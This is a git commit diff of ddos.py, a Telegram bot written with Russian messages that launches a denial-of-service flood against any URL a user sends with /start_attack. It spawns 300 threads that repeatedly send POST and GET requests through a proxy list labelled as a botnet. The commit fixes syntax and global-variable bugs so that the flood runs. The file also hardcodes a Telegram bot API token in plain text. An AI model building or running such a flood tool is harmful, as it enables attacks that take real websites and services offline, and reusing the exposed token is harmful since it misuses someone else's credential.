6e4cf7df716f8e15a223eecf4328c52a99ce9d55
hellovokzal <100135590+hellovokzal@users.noreply.github.com>
2023-07-07 09:29:32 +0500

    Add files via upload

--- ddos.py
+++ ddos.py
@@ -1,16 +1,18 @@
 import telebot
 import requests
 import threading
+
 with open("proxy.txt") as file:
-    proxy = file.read().splitilines()
+    proxy = file.read().splitlines()
+
 def ddos():
     global url
     global on_off
     while True:
         if on_off == 1:
-            for botnet as proxy:
-                load_ddos = requests.post(f"{url}:443", proxies={"https": botnet}, timeout=0.3)
-                load_ddos = requests.get(f"{url}:443", proxies={"https": botnet}, timeout=0.3)
+            for proxy_botnet in proxy:
+                load_ddos = requests.post(f"{url}:443", proxies={"https": proxy_botnet}, timeout=0.3)
+                load_ddos = requests.get(f"{url}:443", proxies={"https": proxy_botnet}, timeout=0.3)
         else:
             break
 
@@ -20,23 +22,22 @@ API_TOKEN = '5942380849:AAGnrTYsbgXo8RDoWhT-gD6IOPaxSliZftM'
 # Бот
 bot = telebot.TeleBot(API_TOKEN)
 
-
 @bot.message_handler(commands=['start'])
 def start(message):
     bot.send_message(message.chat.id, 'Привет! Я бот для атаки DDOS, введи команду /help')
-
 
 @bot.message_handler(commands=['help'])
 def help(message):
     bot.send_message(message.chat.id, 'Я поддерживаю следующие команды: /start, /help, /start_attack <ваша ссылка>, /stop_attack.\nНапример:\n/start_attack https://google.com')
 
-
 @bot.message_handler(commands=['start_attack'])
 def start_attack(message):
     bot.send_message(message.chat.id, 'Атака начата!')
+    global on_off
+    global url
     on_off = 1
     url = message.text[14:len(message.text)]
-    if url[0:8] == https:// or url[0:7] == http://:
+    if url[0:8] == 'https://' or url[0:7] == 'http://':
         potok = 300
         for i in range(potok):
             start_ddos = threading.Thread(target=ddos)
@@ -47,5 +48,7 @@ def start_attack(message):
 @bot.message_handler(commands=['stop_attack'])
 def stop_attack(message):
     bot.send_message(message.chat.id, 'Атака остановлена!')
+    global on_off
     on_off = 0
+
 bot.polling(none_stop=True)
